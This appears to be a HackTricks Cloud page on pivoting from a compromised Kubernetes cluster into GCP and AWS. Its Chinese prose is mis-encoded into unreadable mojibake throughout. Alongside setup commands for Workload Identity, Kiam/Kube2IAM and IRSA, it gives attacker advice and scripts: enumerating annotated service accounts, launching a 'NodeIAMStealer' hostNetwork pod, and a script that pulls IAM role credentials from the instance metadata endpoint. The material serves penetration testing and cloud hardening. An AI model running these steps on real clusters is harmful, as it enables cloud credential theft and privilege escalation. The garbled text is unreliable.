# Kubernetes Pivoting to Clouds

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—® PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDFï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## GCP

å¦‚æœæ‚¨åœ¨ GCP ä¸­è¿è¡Œä¸€ä¸ª k8s é›†ç¾¤ï¼Œæ‚¨å¯èƒ½å¸Œæœ›é›†ç¾¤å†…çš„æŸäº›åº”ç”¨ç¨‹åºèƒ½å¤Ÿè®¿é—® GCPã€‚æœ‰ä¸¤ç§å¸¸è§çš„æ–¹æ³•å¯ä»¥å®ç°è¿™ä¸€ç‚¹ï¼š

### å°† GCP-SA å¯†é’¥æŒ‚è½½ä¸º secret

ç»™ **kubernetes åº”ç”¨ç¨‹åºè®¿é—® GCP** çš„ä¸€ç§å¸¸è§æ–¹æ³•æ˜¯ï¼š

* åˆ›å»ºä¸€ä¸ª GCP æœåŠ¡è´¦å·
* ç»‘å®šæ‰€éœ€çš„æƒé™åˆ°è¯¥è´¦å·ä¸Š
* ä¸‹è½½åˆ›å»ºçš„ SA çš„ json å¯†é’¥
* å°†å…¶ä½œä¸º secret æŒ‚è½½åˆ° pod å†…éƒ¨
* è®¾ç½® GOOGLE\_APPLICATION\_CREDENTIALS ç¯å¢ƒå˜é‡ï¼ŒæŒ‡å‘ json æ–‡ä»¶çš„è·¯å¾„ã€‚

{% hint style="warning" %}
å› æ­¤ï¼Œä½œä¸ºä¸€ä¸ª **æ”»å‡»è€…**ï¼Œå¦‚æœæ‚¨å…¥ä¾µäº† pod å†…éƒ¨çš„å®¹å™¨ï¼Œæ‚¨åº”è¯¥æ£€æŸ¥æ˜¯å¦å­˜åœ¨å…·æœ‰ GCP å‡­æ®çš„ **env** **variable** å’Œ **json** **files**ã€‚
{% endhint %}

### å°† GSA çš„ json å…³è”åˆ° KSA çš„ secret

ä¸€ç§å°† GSA æˆæƒç»™ GKE é›†ç¾¤çš„æ–¹æ³•æ˜¯é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»‘å®šå®ƒä»¬ï¼š

* ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åœ¨ä¸æ‚¨çš„ GKE é›†ç¾¤ç›¸åŒçš„å‘½åç©ºé—´ä¸­åˆ›å»ºä¸€ä¸ª Kubernetes æœåŠ¡è´¦å·ï¼š
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* åˆ›å»ºä¸€ä¸ªåŒ…å«è¦æˆäºˆè®¿é—® GKE é›†ç¾¤çš„ GCP æœåŠ¡å¸å·å‡­æ®çš„ Kubernetes Secretã€‚æ‚¨å¯ä»¥ä½¿ç”¨ `gcloud` å‘½ä»¤è¡Œå·¥å…·æ¥å®Œæˆæ­¤æ“ä½œï¼Œå¦‚ä¸‹æ‰€ç¤ºçš„ç¤ºä¾‹ï¼š
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†Kubernetes Secretç»‘å®šåˆ°KubernetesæœåŠ¡è´¦æˆ·ï¼š
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
åœ¨ç¬¬äºŒæ­¥ä¸­ï¼Œå°†GSAçš„å‡­æ®è®¾ç½®ä¸ºKSAçš„ç§˜å¯†ã€‚ç„¶åï¼Œå¦‚æœæ‚¨å¯ä»¥ä»GKEé›†ç¾¤å†…éƒ¨è¯»å–è¯¥ç§˜å¯†ï¼Œåˆ™å¯ä»¥å‡çº§åˆ°è¯¥GCPæœåŠ¡å¸æˆ·ã€‚
{% endhint %}

### GKEå·¥ä½œè´Ÿè½½èº«ä»½

ä½¿ç”¨å·¥ä½œè´Ÿè½½èº«ä»½ï¼Œæˆ‘ä»¬å¯ä»¥é…ç½®ä¸€ä¸ªKubernetesæœåŠ¡å¸æˆ·æ¥å……å½“GoogleæœåŠ¡å¸æˆ·ã€‚ä½¿ç”¨KubernetesæœåŠ¡å¸æˆ·è¿è¡Œçš„Podåœ¨è®¿é—®Google Cloud APIæ—¶å°†è‡ªåŠ¨ä½œä¸ºGoogleæœåŠ¡å¸æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚

å¯ç”¨æ­¤è¡Œä¸ºçš„**ç¬¬ä¸€ç³»åˆ—æ­¥éª¤**æ˜¯åœ¨GCPä¸­å¯ç”¨å·¥ä½œè´Ÿè½½èº«ä»½ï¼ˆ[æ­¥éª¤](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)ï¼‰å¹¶åˆ›å»ºæ‚¨å¸Œæœ›k8så†’å……çš„GCP SAã€‚

* åœ¨æ–°é›†ç¾¤ä¸Š**å¯ç”¨å·¥ä½œè´Ÿè½½èº«ä»½**

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
* **åˆ›å»º/æ›´æ–°æ–°çš„èŠ‚ç‚¹æ± **ï¼ˆAutopiloté›†ç¾¤ä¸éœ€è¦æ­¤æ“ä½œï¼‰

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* ä»K8sä¸­åˆ›å»ºå…·æœ‰GCPæƒé™çš„**GCPæœåŠ¡å¸å·ä»¥æ¨¡æ‹Ÿ**ï¼š
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **è¿æ¥**åˆ°**é›†ç¾¤**å¹¶**åˆ›å»º**è¦ä½¿ç”¨çš„**æœåŠ¡å¸æˆ·**

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **å°†GSAä¸KSAç»‘å®š**
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* è¿è¡Œä¸€ä¸ªå¸¦æœ‰KSAçš„podï¼Œå¹¶æ£€æŸ¥å¯¹GSAçš„è®¿é—®æƒé™ï¼š
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
{% hint style="warning" %}
ä½œä¸ºK8så†…éƒ¨çš„æ”»å‡»è€…ï¼Œä½ åº”è¯¥æœç´¢å¸¦æœ‰`iam.gke.io/gcp-service-account`æ³¨é‡Šçš„SAï¼Œå› ä¸ºè¿™è¡¨ç¤ºè¯¥SAå¯ä»¥è®¿é—®GCPä¸­çš„æŸäº›å†…å®¹ã€‚å¦ä¸€ä¸ªé€‰é¡¹æ˜¯å°è¯•æ»¥ç”¨é›†ç¾¤ä¸­çš„æ¯ä¸ªKSAå¹¶æ£€æŸ¥å…¶æ˜¯å¦å…·æœ‰è®¿é—®æƒé™ã€‚\
ä»GCPæ–¹é¢æ¥çœ‹ï¼Œæšä¸¾ç»‘å®šå¹¶äº†è§£ä½ åœ¨Kubernetesä¸­ç»™äºˆSAçš„è®¿é—®æƒé™æ€»æ˜¯å¾ˆæœ‰è¶£çš„ã€‚
{% endhint %}

è¿™æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œå¯ä»¥è½»æ¾åœ°**éå†æ‰€æœ‰pod**å®šä¹‰ï¼Œ**æŸ¥æ‰¾**è¯¥**æ³¨é‡Š**ï¼š
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAMï¼ˆPodçš„IAMè§’è‰²ï¼‰<a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

ç»™Podæä¾›IAMè§’è‰²çš„ï¼ˆè¿‡æ—¶çš„ï¼‰æ–¹æ³•æ˜¯ä½¿ç”¨[Kiam](https://github.com/uswitch/kiam)æˆ–[Kube2IAM](https://github.com/jtblin/kube2iam)æœåŠ¡å™¨ã€‚åŸºæœ¬ä¸Šï¼Œæ‚¨éœ€è¦åœ¨é›†ç¾¤ä¸­è¿è¡Œä¸€ä¸ªå…·æœ‰æŸç§ç‰¹æƒIAMè§’è‰²çš„**å®ˆæŠ¤è¿›ç¨‹é›†**ã€‚è¿™ä¸ªå®ˆæŠ¤è¿›ç¨‹é›†å°†ä¸ºéœ€è¦è®¿é—®IAMè§’è‰²çš„Podæä¾›è®¿é—®æƒé™ã€‚

é¦–å…ˆï¼Œæ‚¨éœ€è¦é…ç½®**å“ªäº›è§’è‰²å¯ä»¥åœ¨å‘½åç©ºé—´å†…è®¿é—®**ï¼Œå¯ä»¥é€šè¿‡åœ¨å‘½åç©ºé—´å¯¹è±¡ä¸­æ·»åŠ æ³¨é‡Šæ¥å®ç°ï¼š

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

ä¸€æ—¦å‘½åç©ºé—´é…ç½®äº†IAMè§’è‰²ï¼ŒPodså¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼æŒ‡å®šæ‚¨æƒ³è¦çš„è§’è‰²ï¼š

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
ä½œä¸ºæ”»å‡»è€…ï¼Œå¦‚æœä½ åœ¨podæˆ–å‘½åç©ºé—´ä¸­æ‰¾åˆ°è¿™äº›æ³¨é‡Šï¼Œæˆ–è€…åœ¨è¿è¡Œkiam/kube2iamæœåŠ¡å™¨ï¼ˆå¯èƒ½åœ¨kube-systemä¸­ï¼‰ï¼Œä½ å¯ä»¥å†’å……å·²ç»è¢«podä½¿ç”¨çš„æ¯ä¸ªè§’è‰²ä»¥åŠæ›´å¤šï¼ˆå¦‚æœä½ æœ‰è®¿é—®AWSè´¦æˆ·çš„æƒé™ï¼Œå¯ä»¥æšä¸¾è§’è‰²ï¼‰ã€‚
{% endhint %}

#### ä½¿ç”¨IAMè§’è‰²åˆ›å»ºPod

{% hint style="info" %}
è¦æŒ‡å®šçš„IAMè§’è‰²å¿…é¡»ä¸kiam/kube2iamè§’è‰²ä½äºåŒä¸€ä¸ªAWSè´¦æˆ·ä¸­ï¼Œå¹¶ä¸”è¯¥è§’è‰²å¿…é¡»èƒ½å¤Ÿè®¿é—®å®ƒã€‚
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### é€šè¿‡OIDCä¸ºK8sæœåŠ¡è´¦æˆ·åˆ›å»ºIAMè§’è‰² <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

è¿™æ˜¯AWSæ¨èçš„æ–¹æ³•ã€‚

1. é¦–å…ˆï¼Œæ‚¨éœ€è¦[ä¸ºé›†ç¾¤åˆ›å»ºä¸€ä¸ªOIDCæä¾›ç¨‹åº](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html)ã€‚
2. ç„¶åï¼Œåˆ›å»ºä¸€ä¸ªå…·æœ‰SAæ‰€éœ€æƒé™çš„IAMè§’è‰²ã€‚
3. åˆ›å»ºä¸€ä¸ª[IAMè§’è‰²å’ŒSAä¹‹é—´çš„ä¿¡ä»»å…³ç³»](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html)ï¼Œåç§°ä¸ºï¼ˆæˆ–è€…ç»™äºˆè®¿é—®è¯¥è§’è‰²çš„æ‰€æœ‰SAçš„å‘½åç©ºé—´ï¼‰ã€‚_ä¿¡ä»»å…³ç³»ä¸»è¦æ£€æŸ¥OIDCæä¾›ç¨‹åºåç§°ã€å‘½åç©ºé—´åç§°å’ŒSAåç§°_ã€‚
4. æœ€åï¼Œ**åˆ›å»ºä¸€ä¸ªå¸¦æœ‰æ³¨é‡ŠæŒ‡ç¤ºè§’è‰²ARNçš„SA**ï¼Œå¹¶ä¸”ä½¿ç”¨è¯¥SAè¿è¡Œçš„Podå°†å…·æœ‰**è®¿é—®è§’è‰²çš„ä»¤ç‰Œ**çš„æƒé™ã€‚**ä»¤ç‰Œ**è¢«**å†™å…¥**åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè·¯å¾„åœ¨**`AWS_WEB_IDENTITY_TOKEN_FILE`**ä¸­æŒ‡å®šï¼ˆé»˜è®¤ä¸º`/var/run/secrets/eks.amazonaws.com/serviceaccount/token`ï¼‰ã€‚
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
è¦ä½¿ç”¨`/var/run/secrets/eks.amazonaws.com/serviceaccount/token`ä¸­çš„ä»¤ç‰Œæ¥è·å–awsï¼Œè¯·è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
ä½œä¸ºæ”»å‡»è€…ï¼Œå¦‚æœä½ èƒ½æšä¸¾ä¸€ä¸ªK8sé›†ç¾¤ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰å¸¦æœ‰è¯¥æ³¨é‡Šçš„**æœåŠ¡è´¦æˆ·**ä»¥**å‡çº§åˆ°AWS**ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œåªéœ€ä½¿ç”¨å…¶ä¸­ä¸€ä¸ªIAM**ç‰¹æƒæœåŠ¡è´¦æˆ·**æ‰§è¡Œ/åˆ›å»ºä¸€ä¸ª**pod**å¹¶çªƒå–ä»¤ç‰Œã€‚

æ­¤å¤–ï¼Œå¦‚æœä½ åœ¨ä¸€ä¸ªpodå†…éƒ¨ï¼Œæ£€æŸ¥ç¯å¢ƒå˜é‡ï¼Œå¦‚**AWS\_ROLE\_ARN**å’Œ**AWS\_WEB\_IDENTITY\_TOKEN**ã€‚
{% endhint %}

{% hint style="danger" %}
æœ‰æ—¶ï¼Œ**è§’è‰²çš„ä¿¡ä»»ç­–ç•¥**å¯èƒ½é…ç½®é”™è¯¯ï¼Œè€Œä¸æ˜¯å°†AssumeRoleè®¿é—®æƒé™æˆäºˆé¢„æœŸçš„æœåŠ¡è´¦æˆ·ï¼Œè€Œæ˜¯æˆäºˆ**æ‰€æœ‰æœåŠ¡è´¦æˆ·**ã€‚å› æ­¤ï¼Œå¦‚æœä½ èƒ½åœ¨å—æ§æœåŠ¡è´¦æˆ·ä¸Šå†™å…¥æ³¨é‡Šï¼Œä½ å°±å¯ä»¥è®¿é—®è¯¥è§’è‰²ã€‚

è¯·æŸ¥çœ‹**ä»¥ä¸‹é¡µé¢è·å–æ›´å¤šä¿¡æ¯**ï¼š
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### åœ¨é›†ç¾¤ä¸­æŸ¥æ‰¾å¸¦æœ‰IAMè§’è‰²çš„Podå’ŒSA

è¿™æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œå¯ä»¥è½»æ¾åœ°**éå†æ‰€æœ‰çš„podå’Œsa**å®šä¹‰ï¼Œ**æŸ¥æ‰¾**å¸¦æœ‰è¯¥**æ³¨é‡Š**çš„å†…å®¹ï¼š
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### èŠ‚ç‚¹ IAM è§’è‰²

å‰é¢çš„éƒ¨åˆ†æ˜¯å…³äºå¦‚ä½•é€šè¿‡ pod å·å– IAM è§’è‰²çš„ï¼Œä½†è¯·æ³¨æ„ï¼ŒK8s é›†ç¾¤çš„**èŠ‚ç‚¹å°†æˆä¸ºäº‘ä¸­çš„å®ä¾‹**ã€‚è¿™æ„å‘³ç€èŠ‚ç‚¹å¾ˆæœ‰å¯èƒ½ä¼š**æ‹¥æœ‰ä¸€ä¸ªä½ å¯ä»¥çªƒå–çš„æ–° IAM è§’è‰²**ï¼ˆè¯·æ³¨æ„ï¼Œé€šå¸¸ K8s é›†ç¾¤çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½ä¼šæ‹¥æœ‰ç›¸åŒçš„ IAM è§’è‰²ï¼Œæ‰€ä»¥å°è¯•æ£€æŸ¥æ¯ä¸ªèŠ‚ç‚¹å¯èƒ½ä¸å€¼å¾—ï¼‰ã€‚

ç„¶è€Œï¼Œè¦è®¿é—®èŠ‚ç‚¹çš„å…ƒæ•°æ®ç«¯ç‚¹ï¼Œæœ‰ä¸€ä¸ªé‡è¦çš„è¦æ±‚ï¼Œä½ éœ€è¦åœ¨èŠ‚ç‚¹ä¸Šï¼ˆssh ä¼šè¯ï¼Ÿï¼‰æˆ–è€…è‡³å°‘åœ¨ç›¸åŒçš„ç½‘ç»œä¸­ï¼š
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### å·å– IAM è§’è‰²ä»¤ç‰Œ

ä¹‹å‰æˆ‘ä»¬å·²ç»è®¨è®ºäº†å¦‚ä½•å°† IAM è§’è‰²é™„åŠ åˆ° Pod ä¸Šï¼Œç”šè‡³å¦‚ä½•é€ƒé€¸åˆ°èŠ‚ç‚¹ä¸Šæ¥çªƒå–å®ä¾‹æ‰€é™„åŠ çš„ IAM è§’è‰²ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è„šæœ¬æ¥çªƒå–æ‚¨è¾›è‹¦å·¥ä½œçš„æ–° IAM è§’è‰²å‡­è¯ï¼š
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## å‚è€ƒèµ„æ–™

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—® PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å¾—[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
